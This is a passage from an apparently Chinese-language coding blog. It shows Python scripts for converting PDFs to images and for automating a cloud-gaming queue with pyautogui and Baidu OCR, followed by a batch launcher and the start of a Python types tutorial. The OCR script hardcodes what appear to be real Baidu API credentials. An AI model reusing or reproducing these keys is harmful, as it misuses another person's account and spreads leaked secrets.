datetime.datetime.now()  # 开始时间</span><br><span class=\"line\"></span><br><span class=\"line\">    print(&quot;imagePath=&quot; + imagePath)</span><br><span class=\"line\">    pdfDoc = fitz.open(pdfPath)</span><br><span class=\"line\">    for pg in range(pdfDoc.pageCount):</span><br><span class=\"line\">        page = pdfDoc[pg]</span><br><span class=\"line\">        rotate = int(0)</span><br><span class=\"line\">        # 每个尺寸的缩放系数为1.3，这将为我们生成分辨率提高2.6的图像。</span><br><span class=\"line\">        # 此处若是不做设置，默认图片大小为：792X612, dpi=96</span><br><span class=\"line\">        zoom_x = 1.33333333  # (1.33333333--&gt;1056x816)   (2--&gt;1584x1224)</span><br><span class=\"line\">        zoom_y = 1.33333333</span><br><span class=\"line\">        mat = fitz.Matrix(zoom_x, zoom_y).preRotate(rotate)</span><br><span class=\"line\">        pix = page.getPixmap(matrix=mat, alpha=False)</span><br><span class=\"line\"></span><br><span class=\"line\">        if not os.path.exists(imagePath):  # 判断存放图片的文件夹是否存在</span><br><span class=\"line\">            os.makedirs(imagePath)  # 若图片文件夹不存在就创建</span><br><span class=\"line\"></span><br><span class=\"line\">        pix.writePNG(imagePath + &#x27;/&#x27; + &#x27;images_%s.png&#x27; % pg)  # 将图片写入指定的文件夹内</span><br><span class=\"line\"></span><br><span class=\"line\">    endTime_pdf2img = datetime.datetime.now()  # 结束时间</span><br><span class=\"line\">    print(&#x27;pdf2img时间=&#x27;, (endTime_pdf2img - startTime_pdf2img).seconds)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    # 1、PDF地址</span><br><span class=\"line\">    pdfPath = &#x27;navicat.pdf&#x27;</span><br><span class=\"line\">    # 2、需要储存图片的目录</span><br><span class=\"line\">    imagePath = &#x27;./imgs&#x27;</span><br><span class=\"line\">    pyMuPDF_fitz(pdfPath, imagePath)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"queue1121-py\"><a href=\"#queue1121-py\" class=\"headerlink\" title=\"queue1121.py\"></a>queue1121.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">import pyautogui</span><br><span class=\"line\">import time</span><br><span class=\"line\">from datetime import datetime as datetime1</span><br><span class=\"line\">import datetime</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">size1 = pyautogui.size()</span><br><span class=\"line\"></span><br><span class=\"line\">print(size1)</span><br><span class=\"line\"></span><br><span class=\"line\">point1 = pyautogui.position()</span><br><span class=\"line\"></span><br><span class=\"line\">print(point1) # x=1052, y=717</span><br><span class=\"line\"></span><br><span class=\"line\"># pyautogui.click(1052,717,duration=0.5)</span><br><span class=\"line\"># time.sleep(5)</span><br><span class=\"line\"></span><br><span class=\"line\"># pyautogui.hotkey(&#x27;alt&#x27;,&#x27;tab&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">time.sleep(3)</span><br><span class=\"line\"></span><br><span class=\"line\"># while True:</span><br><span class=\"line\">#     try:</span><br><span class=\"line\">#         loc1 = pyautogui.locateCenterOnScreen(&quot;a:\\shot1.png&quot;, region=(937, 634, 250, 150))</span><br><span class=\"line\"></span><br><span class=\"line\">#         pyautogui.moveTo(*loc1, duration=0.5)</span><br><span class=\"line\"></span><br><span class=\"line\">#         pyautogui.click(clicks=1)</span><br><span class=\"line\"></span><br><span class=\"line\">#         break</span><br><span class=\"line\">#     except:</span><br><span class=\"line\"></span><br><span class=\"line\">#         time.sleep(5)</span><br><span class=\"line\">#         print(&#x27;Try again&#x27;)</span><br><span class=\"line\">#         continue</span><br><span class=\"line\"></span><br><span class=\"line\">def date_and_time():</span><br><span class=\"line\">\tdayOfWeek = datetime1.now().isoweekday()</span><br><span class=\"line\">\tdt = datetime.datetime.now().strftime(&#x27;%H&#x27;)</span><br><span class=\"line\">\thour = []</span><br><span class=\"line\">\tfor i in range(13,23):</span><br><span class=\"line\">\t\thour.append(i)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif ((dayOfWeek == 6) or (dayOfWeek == 7)) and (int(dt) in hour):</span><br><span class=\"line\">\t\tmultiple = 3</span><br><span class=\"line\">\telif (int(dt) in hour) or ((dayOfWeek == 6) or (dayOfWeek == 7)):</span><br><span class=\"line\">\t\tmultiple = 2</span><br><span class=\"line\">\telse:</span><br><span class=\"line\">\t\tmultiple = 1</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn multiple</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def enter_game():</span><br><span class=\"line\">\ttime.sleep(40)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpyautogui.press(&#x27;space&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\ttime.sleep(5)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpyautogui.press(&#x27;space&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\ttime.sleep(5)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpyautogui.press(&#x27;enter&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\ttime.sleep(30)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpyautogui.press(&#x27;space&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\ttime.sleep(20)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpyautogui.press(&#x27;space&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\ttime.sleep(60)</span><br><span class=\"line\"></span><br><span class=\"line\">\twhile True:</span><br><span class=\"line\">\t\tpyautogui.press([&#x27;w&#x27;,&#x27;a&#x27;,&#x27;space&#x27;], interval=1)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\ttime.sleep(5)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def enter_cloud():</span><br><span class=\"line\">\tpyautogui.keyDown(&#x27;alt&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpyautogui.press(&#x27;tab&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\ttime.sleep(5)</span><br><span class=\"line\"></span><br><span class=\"line\">\twhile True:</span><br><span class=\"line\">\t    try:</span><br><span class=\"line\">\t        loc2 = pyautogui.locateCenterOnScreen(&quot;a:\\cloud.png&quot;, region=(153, 251, 1600, 520))</span><br><span class=\"line\"></span><br><span class=\"line\">\t        print(loc2)</span><br><span class=\"line\"></span><br><span class=\"line\">\t        x1 = loc2[0]</span><br><span class=\"line\">\t        y1 = loc2[1]+100</span><br><span class=\"line\"></span><br><span class=\"line\">\t        print(x1,y1)</span><br><span class=\"line\"></span><br><span class=\"line\">\t        pyautogui.moveTo(x1,y1, duration=0.5)</span><br><span class=\"line\"></span><br><span class=\"line\">\t        pyautogui.click(clicks=1)</span><br><span class=\"line\"></span><br><span class=\"line\">\t        break</span><br><span class=\"line\">\t    except:</span><br><span class=\"line\"></span><br><span class=\"line\">\t        time.sleep(5)</span><br><span class=\"line\">\t        print(&#x27;Cloud desktop does not be opened, open it then try again&#x27;)</span><br><span class=\"line\">\t        pyautogui.keyUp(&#x27;alt&#x27;)</span><br><span class=\"line\">\t        time.sleep(30)</span><br><span class=\"line\">\t        pyautogui.keyDown(&#x27;alt&#x27;)</span><br><span class=\"line\">\t        pyautogui.press(&#x27;tab&#x27;)</span><br><span class=\"line\">\t        time.sleep(5)</span><br><span class=\"line\">\t        continue</span><br><span class=\"line\"></span><br><span class=\"line\">\tpyautogui.keyUp(&#x27;alt&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def queue_state():</span><br><span class=\"line\">\ttry:</span><br><span class=\"line\">\t\tloc1 = pyautogui.locateCenterOnScreen(&quot;a:\\shot1.png&quot;, region=(937, 634, 250, 150))</span><br><span class=\"line\">\t\tpyautogui.moveTo(*loc1, duration=0.5)</span><br><span class=\"line\">\t\tpyautogui.click(clicks=1)</span><br><span class=\"line\">\t\treturn 0</span><br><span class=\"line\">\texcept:</span><br><span class=\"line\">\t\ttry:</span><br><span class=\"line\">\t\t\tloc1 = pyautogui.locateCenterOnScreen(&quot;a:\\shot.png&quot;, region=(937, 634, 250, 150))</span><br><span class=\"line\">\t\t\tpyautogui.moveTo(*loc1, duration=0.5)</span><br><span class=\"line\">\t\t\tpyautogui.click(clicks=1)</span><br><span class=\"line\">\t\t\treturn 1</span><br><span class=\"line\">\t\t\t# pyautogui.hotkey(&#x27;alt&#x27;,&#x27;tab&#x27;)</span><br><span class=\"line\">\t\texcept:</span><br><span class=\"line\">\t\t\tloc4 = pyautogui.locateCenterOnScreen(&quot;a:\\detail.png&quot;, region=(117, 950, 105, 60))</span><br><span class=\"line\">\t\t\tpyautogui.moveTo(*loc4, duration=0.5)</span><br><span class=\"line\">\t\t\tpyautogui.click(clicks=1)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\ttry: </span><br><span class=\"line\">\t\t\t\tloc1 = pyautogui.locateCenterOnScreen(&quot;a:\\shot1.png&quot;, region=(937, 634, 250, 150))</span><br><span class=\"line\">\t\t\t\tpyautogui.moveTo(*loc1, duration=0.5)</span><br><span class=\"line\">\t\t\t\tpyautogui.click(clicks=1)</span><br><span class=\"line\">\t\t\t\treturn 0</span><br><span class=\"line\">\t\t\texcept:</span><br><span class=\"line\">\t\t\t\tloc1 = pyautogui.locateCenterOnScreen(&quot;a:\\shot.png&quot;, region=(937, 634, 250, 150))</span><br><span class=\"line\">\t\t\t\tpyautogui.moveTo(*loc1, duration=0.5)</span><br><span class=\"line\">\t\t\t\tpyautogui.click(clicks=1)</span><br><span class=\"line\">\t\t\t\treturn 1</span><br><span class=\"line\">\t\t\t\t# pyautogui.hotkey(&#x27;alt&#x27;,&#x27;tab&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">def pytesseractOCR1():</span><br><span class=\"line\">\tpyautogui.screenshot(&#x27;a:\\\\10.png&#x27;,region=(746,260,400,200))</span><br><span class=\"line\"></span><br><span class=\"line\">\ttime.sleep(2)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpyautogui.hotkey(&#x27;alt&#x27;,&#x27;tab&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\ttime.sleep(2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\timport pytesseract</span><br><span class=\"line\">\tfrom PIL import Image</span><br><span class=\"line\"></span><br><span class=\"line\">\tim = Image.open(&#x27;a:\\\\10.jpg&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tstring = pytesseract.image_to_string(im) #, lang=&#x27;chi_sim&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tprint(string)</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn string</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">import os # 操作系统相关</span><br><span class=\"line\">import sys # 系统相关</span><br><span class=\"line\">import time # 时间获取</span><br><span class=\"line\">import signal # 系统信号</span><br><span class=\"line\">import winsound # 提示音</span><br><span class=\"line\">from aip import AipOcr  # 百度OCR API</span><br><span class=\"line\">from PIL import ImageGrab # 捕获剪切板中的图片</span><br><span class=\"line\">import win32clipboard as wc # WINDOWS 剪切板操作</span><br><span class=\"line\">import win32con # 这里用于获取 WINDOWS 剪贴板数据的标准格式</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot; 你的 APPID AK SK &quot;&quot;&quot;</span><br><span class=\"line\">APP_ID = &#x27;23564063&#x27;</span><br><span class=\"line\">API_KEY = &#x27;LXzNPBTFspP4G078ckg1IRNR&#x27;</span><br><span class=\"line\">SECRET_KEY = &#x27;grUtbwfub20E9kp3ShFWCBOshMqcKeuI&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">client = AipOcr(APP_ID, API_KEY, SECRET_KEY)</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot; 读取图片 &quot;&quot;&quot;</span><br><span class=\"line\">def get_file_content(filePath):</span><br><span class=\"line\">    with open(filePath, &#x27;rb&#x27;) as fp:</span><br><span class=\"line\">        return fp.read()</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot; 从API的返回字典中获取文字 &quot;&quot;&quot;</span><br><span class=\"line\">def getOcrText(txt_dict):</span><br><span class=\"line\">\ttxt = &quot;&quot;</span><br><span class=\"line\">\tif type(txt_dict) == dict:</span><br><span class=\"line\">\t\tfor i in txt_dict[&#x27;words_result&#x27;]:</span><br><span class=\"line\">\t\t\ttxt = txt + i[&quot;words&quot;]</span><br><span class=\"line\">\t\t\tif len(i[&quot;words&quot;]) &lt; 25: # 这里使用字符串长度决定了文本是否换行，读者可以根据自己的喜好控制回车符的输出，实现可控的文本显示形式</span><br><span class=\"line\">\t\t\t\ttxt = txt + &quot;\\n\\n&quot;</span><br><span class=\"line\">\treturn txt</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot; 调用通用/高精度文字识别, 图片参数为本地图片 &quot;&quot;&quot;</span><br><span class=\"line\">def BaiduOcr(imageName,Accurate=True):</span><br><span class=\"line\">\timage = get_file_content(imageName)</span><br><span class=\"line\">\tif Accurate:</span><br><span class=\"line\">\t\treturn getOcrText(client.basicGeneral(image))</span><br><span class=\"line\">\telse:</span><br><span class=\"line\">\t\treturn getOcrText(client.basicAccurate(image))</span><br><span class=\"line\">\t</span><br><span class=\"line\">&quot;&quot;&quot; 带参数调用通用文字识别, 图片参数为远程url图片 &quot;&quot;&quot;</span><br><span class=\"line\">def BaiduOcrUrl(url): </span><br><span class=\"line\">\treturn getOcrText(client.basicGeneralUrl(url))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot; 剪切板操作函数 &quot;&quot;&quot;</span><br><span class=\"line\">def get_clipboard():</span><br><span class=\"line\">    wc.OpenClipboard()</span><br><span class=\"line\">    txt = wc.GetClipboardData(win32con.CF_UNICODETEXT)</span><br><span class=\"line\">    wc.CloseClipboard()</span><br><span class=\"line\">    return txt</span><br><span class=\"line\"></span><br><span class=\"line\">def empty_clipboard():</span><br><span class=\"line\">    wc.OpenClipboard()</span><br><span class=\"line\">    wc.EmptyClipboard()</span><br><span class=\"line\">    wc.CloseClipboard()</span><br><span class=\"line\"></span><br><span class=\"line\">def set_clipboard(txt):</span><br><span class=\"line\">    wc.OpenClipboard()</span><br><span class=\"line\">    wc.EmptyClipboard()</span><br><span class=\"line\">    wc.SetClipboardData(win32con.CF_UNICODETEXT, txt)</span><br><span class=\"line\">    wc.CloseClipboard()</span><br><span class=\"line\">    </span><br><span class=\"line\">&quot;&quot;&quot; 截图后,调用通用/高精度文字识别&quot;&quot;&quot;</span><br><span class=\"line\">def BaiduOcrScreenshots(Accurate=True,path=&quot;./&quot;,ifauto=False):</span><br><span class=\"line\">\tif not os.path.exists(path):</span><br><span class=\"line\">\t\tos.makedirs(path)</span><br><span class=\"line\">\timage = ImageGrab.grabclipboard()</span><br><span class=\"line\">\tif image != None:</span><br><span class=\"line\">\t\tprint(&quot;\\rThe image has been obtained. Please wait a moment!&quot;,end=&quot;\\n&quot;)</span><br><span class=\"line\">\t\tfilename = str(time.time_ns())</span><br><span class=\"line\">\t\timage.save(path+filename+&quot;.png&quot;)</span><br><span class=\"line\">\t\tif Accurate:</span><br><span class=\"line\">\t\t\ttxt = getOcrText(client.basicAccurate(get_file_content(path+filename+&quot;.png&quot;)))</span><br><span class=\"line\">\t\telse:\t</span><br><span class=\"line\">\t\t\ttxt = getOcrText(client.basicGeneral(get_file_content(path+filename+&quot;.png&quot;)))</span><br><span class=\"line\">\t\t\tos.remove(path+filename+&quot;.png&quot;)</span><br><span class=\"line\">\t\t# f = open(os.path.abspath(path)+&quot;\\\\&quot;+filename+&quot;.txt&quot;,&#x27;w&#x27;)</span><br><span class=\"line\">\t\t# f.write(txt)</span><br><span class=\"line\">\t\tset_clipboard(txt)</span><br><span class=\"line\">\t\twinsound.PlaySound(&#x27;SystemAsterisk&#x27;,winsound.SND_ASYNC)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t# os.startfile(os.path.abspath(path)+&quot;\\\\&quot;+filename+&quot;.txt&quot;)</span><br><span class=\"line\">\t\t# empty_clipboard()</span><br><span class=\"line\">\t\treturn txt</span><br><span class=\"line\">\telse :</span><br><span class=\"line\">\t\tif not ifauto:</span><br><span class=\"line\">\t\t\tprint(&quot;Please get the screenshots by Shift+Win+S!     &quot;,end=&quot;&quot;)</span><br><span class=\"line\">\t\t\treturn &quot;&quot;</span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tprint(&quot;\\rPlease get the screenshots by Shift+Win+S !       &quot;,end=&quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">def sig_handler(signum, frame):</span><br><span class=\"line\">    sys.exit(0)</span><br><span class=\"line\">    </span><br><span class=\"line\">def removeTempFile(file = [&quot;.txt&quot;,&quot;.png&quot;],path=&quot;./&quot;):</span><br><span class=\"line\">\tif not os.path.exists(path):</span><br><span class=\"line\">\t\tos.makedirs(path)</span><br><span class=\"line\">\tpathDir =  os.listdir(path)</span><br><span class=\"line\">\tfor i in pathDir:</span><br><span class=\"line\">\t\tfor j in file:</span><br><span class=\"line\">\t\t\tif j in i:</span><br><span class=\"line\">\t\t\t\tos.remove(path+i)</span><br><span class=\"line\"></span><br><span class=\"line\">def AutoOcrFile(path=&quot;./&quot;,filetype=[&quot;.png&quot;,&quot;.jpg&quot;,&quot;.bmp&quot;]):</span><br><span class=\"line\">\tif not os.path.exists(path):</span><br><span class=\"line\">\t\tos.makedirs(path)</span><br><span class=\"line\">\tpathDir =  os.listdir(path)</span><br><span class=\"line\">\tfor i in pathDir:</span><br><span class=\"line\">\t\tfor j in filetype:</span><br><span class=\"line\">\t\t\tif j in i:</span><br><span class=\"line\">\t\t\t\tf = open(os.path.abspath(path)+&quot;\\\\&quot;+str(time.time_ns())+&quot;.txt&quot;,&#x27;w&#x27;)</span><br><span class=\"line\">\t\t\t\tf.write(BaiduOcr(path+i))</span><br><span class=\"line\">\t\t\t\tbreak</span><br><span class=\"line\"></span><br><span class=\"line\">def AutoOcrScreenshots():</span><br><span class=\"line\">\tsignal.signal(signal.SIGINT, sig_handler)</span><br><span class=\"line\">\tsignal.signal(signal.SIGTERM, sig_handler)</span><br><span class=\"line\">\t# print(&quot;Waiting For Ctrl+C to exit ater removing all picture files and txt files!&quot;)</span><br><span class=\"line\">\t# print(&quot;Please get the screenshots by Shift+Win+S !&quot;,end=&quot;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\tpyautogui.hotkey(&#x27;shift&#x27;,&#x27;win&#x27;,&#x27;s&#x27;)</span><br><span class=\"line\">\ttime.sleep(1)</span><br><span class=\"line\">\tpyautogui.moveTo(713,253, duration=0.5)  # (872,318)</span><br><span class=\"line\">\tpyautogui.dragRel(495,505,duration=0.5)  # (230,65) #(230,275)</span><br><span class=\"line\">\ttime.sleep(1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\twhile(1):</span><br><span class=\"line\">\t\ttry:</span><br><span class=\"line\">\t\t\ttxt1 = BaiduOcrScreenshots(ifauto=True)</span><br><span class=\"line\">\t\t\t# print(txt1)</span><br><span class=\"line\">\t\t\ttime.sleep(0.1)</span><br><span class=\"line\">\t\t\tremoveTempFile()</span><br><span class=\"line\">\t\t\treturn txt1</span><br><span class=\"line\">\t\texcept SystemExit:</span><br><span class=\"line\">\t\t\tremoveTempFile()</span><br><span class=\"line\">\t\t\tbreak</span><br><span class=\"line\">\t\telse :</span><br><span class=\"line\">\t\t\tpyautogui.hotkey(&#x27;ctrl&#x27;,&#x27;c&#x27;) # pass</span><br><span class=\"line\">\t\tfinally:</span><br><span class=\"line\">\t\t\tpass</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">enter_cloud()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">\ttxt2 = AutoOcrScreenshots()</span><br><span class=\"line\">print(txt2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># num1=[31,32,33,34,35,36,37,38,39,40]</span><br><span class=\"line\"># num2=[21,22,23,24,25,26,27,28,29,30]</span><br><span class=\"line\"># num3=[11,12,13,14,15,16,17,18,19,20]</span><br><span class=\"line\"># num4=[5,6,7,8,9,10]</span><br><span class=\"line\"># num5=[1,2,3,4]</span><br><span class=\"line\"></span><br><span class=\"line\">num1=[]</span><br><span class=\"line\">num2=[&#x27;第1位&#x27;,&#x27;第2位&#x27;,&#x27;第3位&#x27;,&#x27;第4位&#x27;]</span><br><span class=\"line\">string3=&#x27;排队结束&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(5,41):</span><br><span class=\"line\">\tnum1.append(&#x27;第&#123;&#125;位&#x27;.format(i))</span><br><span class=\"line\"></span><br><span class=\"line\">print(num1)</span><br><span class=\"line\"></span><br><span class=\"line\">t1=True</span><br><span class=\"line\">run1=1</span><br><span class=\"line\"></span><br><span class=\"line\">while t1:</span><br><span class=\"line\"></span><br><span class=\"line\">\tprint(&#x27; &#x27;)</span><br><span class=\"line\">\tprint(&#x27;start: &#123;&#125;&#x27;.format(txt2))</span><br><span class=\"line\">\tfor i in num2:</span><br><span class=\"line\">\t\tif i in txt2:</span><br><span class=\"line\">\t\t\tprint(&#x27;*&#x27;*20,&#x27;wait for a while to enter game&#x27;,&#x27;*&#x27;*20)</span><br><span class=\"line\">\t\t\tstate1=1</span><br><span class=\"line\">\t\t\twhile state1:</span><br><span class=\"line\">\t\t\t\tstate1 = queue_state()</span><br><span class=\"line\">\t\t\t\tprint(state1)</span><br><span class=\"line\">\t\t\t\ttime.sleep(2)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tt1=False</span><br><span class=\"line\">\t\t\tbreak</span><br><span class=\"line\">\telse:</span><br><span class=\"line\">\t\tfor i in num1:</span><br><span class=\"line\">\t\t\tif i in txt2:</span><br><span class=\"line\">\t\t\t\tprint(i)</span><br><span class=\"line\">\t\t\t\ttime.sleep(2)</span><br><span class=\"line\">\t\t\t\tif run1 == 1:</span><br><span class=\"line\">\t\t\t\t\tpyautogui.keyDown(&#x27;alt&#x27;)</span><br><span class=\"line\">\t\t\t\t\tpyautogui.press(&#x27;tab&#x27;)</span><br><span class=\"line\">\t\t\t\t\tpyautogui.press(&#x27;tab&#x27;)</span><br><span class=\"line\">\t\t\t\t\tpyautogui.keyUp(&#x27;alt&#x27;)</span><br><span class=\"line\">\t\t\t\t\ttime.sleep(1)</span><br><span class=\"line\">\t\t\t\t\tpyautogui.press(&#x27;enter&#x27;)</span><br><span class=\"line\">\t\t\t\t\tpyautogui.click(718,700,duration=0.5)</span><br><span class=\"line\">\t\t\t\telse:</span><br><span class=\"line\">\t\t\t\t\tpyautogui.keyDown(&#x27;alt&#x27;)</span><br><span class=\"line\">\t\t\t\t\tpyautogui.press(&#x27;tab&#x27;)</span><br><span class=\"line\">\t\t\t\t\tpyautogui.keyUp(&#x27;alt&#x27;)</span><br><span class=\"line\">\t\t\t\t\ttime.sleep(1)</span><br><span class=\"line\">\t\t\t\t\tpyautogui.click(718,700,duration=0.5)</span><br><span class=\"line\">\t\t\t\trun1=2</span><br><span class=\"line\">\t\t\t\t# print(int(i[1:len(i)-1]))</span><br><span class=\"line\">\t\t\t\tmultiple1 = date_and_time()</span><br><span class=\"line\">\t\t\t\tprint(multiple1)</span><br><span class=\"line\">\t\t\t\ttime.sleep(int(i[1:len(i)-1])*multiple1*5)</span><br><span class=\"line\">\t\t\t\tpyautogui.click(718,700,duration=0.5)</span><br><span class=\"line\">\t\t\t\tenter_cloud()</span><br><span class=\"line\">\t\t\t\ttxt2 = AutoOcrScreenshots()</span><br><span class=\"line\">\t\t\t\ttime.sleep(2)</span><br><span class=\"line\">\t\t\t\t# pyautogui.hotkey(&#x27;alt&#x27;,&#x27;tab&#x27;)</span><br><span class=\"line\">\t\t\t\tbreak</span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tif string3 in txt2:</span><br><span class=\"line\">\t\t\t\tqueue_state()</span><br><span class=\"line\">\t\t\t\tbreak</span><br><span class=\"line\">\t\t\tprint(&#x27;not in queue&#x27;)</span><br><span class=\"line\">\t\t\tpyautogui.moveTo(148,495,duration=0.5)</span><br><span class=\"line\">\t\t\tpyautogui.click(clicks=1)</span><br><span class=\"line\">\t\t\t# time.sleep(8)</span><br><span class=\"line\">\t\t\ttry:</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\ttime.sleep(8)</span><br><span class=\"line\">\t\t\t\tpyautogui.press(&#x27;win&#x27;)</span><br><span class=\"line\">\t\t\t\ttime.sleep(1)</span><br><span class=\"line\">\t\t\t\tpyautogui.press(&#x27;win&#x27;)</span><br><span class=\"line\">\t\t\t\tloc1 = pyautogui.locateCenterOnScreen(&quot;a:\\ingame.png&quot;, region=(57, 42, 250, 100))</span><br><span class=\"line\">\t\t\t\tpyautogui.moveTo(*loc1, duration=0.5)</span><br><span class=\"line\">\t\t\t\t# pyautogui.click(clicks=1)</span><br><span class=\"line\">\t\t\t\tbreak</span><br><span class=\"line\">\t\t\texcept:</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\ttime.sleep(2)</span><br><span class=\"line\">\t\t\t\ttxt2 = AutoOcrScreenshots()</span><br><span class=\"line\">\t\t\t\ttime.sleep(5)</span><br><span class=\"line\">\t\t\t\t# pyautogui.hotkey(&#x27;alt&#x27;,&#x27;tab&#x27;)</span><br><span class=\"line\">\t\t\t\tprint(&#x27; &#x27;)</span><br><span class=\"line\">\t\t\t\tprint(&#x27;End: &#123;&#125;&#x27;.format(txt2))</span><br><span class=\"line\">\t\t\t\t# time.sleep(5)</span><br><span class=\"line\">\t\t\t\t# pyautogui.hotkey(&#x27;alt&#x27;,&#x27;tab&#x27;)</span><br><span class=\"line\">\t\t\t\tcontinue</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t# for i in num1:</span><br><span class=\"line\">\t# \tif str(i) in txt2:</span><br><span class=\"line\">\t# \t\tpyautogui.hotkey(&#x27;alt&#x27;,&#x27;tab&#x27;)</span><br><span class=\"line\">\t# \t\ttime.sleep(7200)</span><br><span class=\"line\">\t# \t\ttxt2 = AutoOcrScreenshots()</span><br><span class=\"line\">\t# \t\tbreak</span><br><span class=\"line\">\t# else:</span><br><span class=\"line\">\t# \tfor i in num2:</span><br><span class=\"line\">\t# \t\tif str(i) in txt2:</span><br><span class=\"line\">\t# \t\t\tpyautogui.hotkey(&#x27;alt&#x27;,&#x27;tab&#x27;)</span><br><span class=\"line\">\t# \t\t\ttime.sleep(3600)</span><br><span class=\"line\">\t# \t\t\ttxt2 = AutoOcrScreenshots()</span><br><span class=\"line\">\t# \t\t\tbreak</span><br><span class=\"line\">\t# \telse:</span><br><span class=\"line\">\t# \t\tfor i in num3:</span><br><span class=\"line\">\t# \t\t\tif str(i) in txt2:</span><br><span class=\"line\">\t# \t\t\t\tpyautogui.hotkey(&#x27;alt&#x27;,&#x27;tab&#x27;)</span><br><span class=\"line\">\t# \t\t\t\ttime.sleep(1800)</span><br><span class=\"line\">\t# \t\t\t\ttxt2 = AutoOcrScreenshots()</span><br><span class=\"line\">\t# \t\t\t\tbreak</span><br><span class=\"line\">\t# \t\telse:</span><br><span class=\"line\">\t# \t\t\tfor i in num4:</span><br><span class=\"line\">\t# \t\t\t\tif str(i) in txt2:</span><br><span class=\"line\">\t# \t\t\t\t\tpyautogui.hotkey(&#x27;alt&#x27;,&#x27;tab&#x27;)</span><br><span class=\"line\">\t# \t\t\t\t\ttime.sleep(900)</span><br><span class=\"line\">\t# \t\t\t\t\ttxt2 = AutoOcrScreenshots()</span><br><span class=\"line\">\t# \t\t\t\t\tbreak</span><br><span class=\"line\">\t# \t\t\telse:</span><br><span class=\"line\">\t# \t\t\t\tfor i in num5:</span><br><span class=\"line\">\t# \t\t\t\t\tif str(i) in txt2:</span><br><span class=\"line\">\t# \t\t\t\t\t\tprint(&#x27;wait&#x27;)</span><br><span class=\"line\">\t# \t\t\t\t\t\tbreak</span><br><span class=\"line\">\t# \t\t\t\telse:</span><br><span class=\"line\">\t# \t\t\t\t\tprint(&#x27;not in queue&#x27;)</span><br><span class=\"line\">\t# \t\t\t\t\tbreak</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"queue-bat\"><a href=\"#queue-bat\" class=\"headerlink\" title=\"queue.bat\"></a>queue.bat</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">%echo off</span><br><span class=\"line\"></span><br><span class=\"line\">python queue1121.py</span><br><span class=\"line\"></span><br><span class=\"line\">pause</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"可变与不可变类型-py\"><a href=\"#可变与不可变类型-py\" class=\"headerlink\" title=\"可变与不可变类型.py\"></a>可变与不可变类型.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 可变与不可变</span><br><span class=\"line\"></span><br><span class=\"line\"># 不可变：对象所指向的内存中的值是不可以改变的</span><br><span class=\"line\"></span><br><span class=\"line\"># 不可变的类型： int, str, float, tuple, frozenset</span><br><span class=\"line\"></span><br><span class=\"line\">num=10</span><br><span class=\"line\"></span><br><span class=\"line\">s1=&#x27;abc&#x27;</span><br><span class=\"line\">s2=&#x27;abcd&#x27;</span><br><span class=\"line\">print(id(s1))</span><br><span class=\"line\">print(id(s2))</span><br><span class=\"line\"></span><br><span class=\"line\">t1=(3,5,6)</span><br><span class=\"line\">print(id(t1))</span><br><span 